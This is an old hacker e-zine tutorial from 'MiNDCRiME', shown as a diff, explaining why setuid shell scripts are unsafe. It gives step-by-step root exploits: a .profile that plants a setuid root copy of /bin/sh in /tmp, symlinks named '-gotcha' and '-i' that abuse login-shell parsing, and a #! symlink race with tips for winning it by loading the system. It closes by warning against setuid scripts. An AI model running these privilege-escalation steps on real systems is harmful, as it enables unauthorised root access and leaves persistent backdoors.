@@ -1,0 +1,94 @@
+=================================[MiNDCRiME]==================================
+[FiLE #3:]
+[I'd like to remind folks that this is the "Beginner's" section. Most of
+ you will know this. I don't need to hear colorful remarks about
+ how "old" this is. -hc]
+ 
+    "Why shell scripts with the set-user-id bit set aren't safe?"
+                                by zomo
+ 
+ Most shells will run as a login shell if the first character of their
+argv[0] starts with a '-'. This is how login manages to give you a login
+shell (check login.c). It calls csh as '-csh'. One of the things that a 
+login shell does is read your .profile or .cshrc.
+ 
+ On some systems, the shell is stupid enough to read and run $HOME/.profile
+(or equivalent) even if it is running set-uid (effective uid != real uid).
+ 
+ So, 
+% ls -l /usr/local/bin/setuid-shell-script
+-rwsr-xr-x  1 root        51763 Nov 16  1993 setuid-shell-script
+% cat > .profile << _EOF_
+cp /bin/sh /tmp/fuck
+chown root.wheel /tmp/fuck
+chmod 4755 /tmp/fuck
+_EOF_
+% ln -s /usr/local/bin/setuid-shell-script -gotcha
+% ./-gotcha
+% /tmp/fuck
+# 
+ 
+ You got it! And there is another easy-to-exploit bug with set-uid shell
+script.
+% ls -l /usr/local/bin/setuid-shell-script
+-rwsr-xr-x  1 root        51763 Nov 16  1993 setuid-shell-script
+% ln -s /usr/local/bin/setuid-shell-script -i
+% ./-i
+#
+ Try it and think how it works (or it doesn't work ;) ).
+ 
+ Now for the second security hole. It works on almost all #! systems.
+Not only with shell scripts. When the kernel execs a file, it looks for
+a magic number in the first two bytes ( try % man a.out ). If the magic
+number is '#!', then it takes the next one or two tokens, execs file 
+into which token parsed, with the full pathname of the script as an 
+argument. ( get the kernel source of BSD unix and check exec.c )
+So if /user/crash/dummies starts with:
+ 
+#!/bin/sh
+ then the kernel, in the process of loading this, would do:
+execute "/bin/sh /user/crash/dummies". In other words, /bin/sh would
+have /user/crash/dummies as argv[0]. If it was 
+#!/bin/csh -f
+ then the kernel would execs "/bin/csh -f /user/crash/dummies"
+ 
+ The important thing to note here is that the shell re-opens the file
+fo itself. The kernel does not pass an open file descripter to shell.
+The race condition arises here.
+ 
+% ls -l /usr/local/bin/setuid-shell-script
+-rwsr-xr-x  1 root        51763 Nov 16  1993 setuid-shell-script
+% ln -s /usr/local/bin/setuid-shell-script hack-link
+% cat > hack-commands << _EOF_
+cp /bin/sh /tmp/fuck
+chown root.wheel /tmp/fuck
+chmod 4755 /tmp/fuck
+_EOF_
+% ./hack-link
+ 
+ So the kernel stat()s hack-link. stat() follows the link and see the 
+set-uid bit set with setuid-shell-script and the owner being root. So
+the kernel sets uid to root (check exec.c, you can find this routine).
+Then it executes the following command:
+ 
+/bin/sh /user/danny/hack-link
+with uid set to 0.
+ The uid-zero shell opens /user/danny/hack-link. The open() follows the
+link and opens the file at the other end (/usr/local/bin/setuid-shell-script)
+and executes the commands from it. Still no security hole.
+ But what if while the kernel was doing this, you did:
+% rm mylink; ln -s /user/danny/hack-commands /usr/danny/hack-link
+ Now when the kernel followed hack-link, 
+it found /usr/local/bin/setuid-shell-script. So it set uid to 0. But the
+time the /bin/sh follwed hack-link to open it, it find it was linked to
+hack-commands, not /usr/local/bin/setuid-shell-script. So it execute 
+hack-commands as root.
+ 
+ Now you will almost certainly not win such a race with the kernel.
+ 
+But you can increase the probability of win a race by increasing 
+system load (i.e. execute X application, compute complex math problem)
+and doing race with fast and optimized C program.
+ 
+The moral of story: DO NOT SET-UID ANY SCRIPTS.
+ 
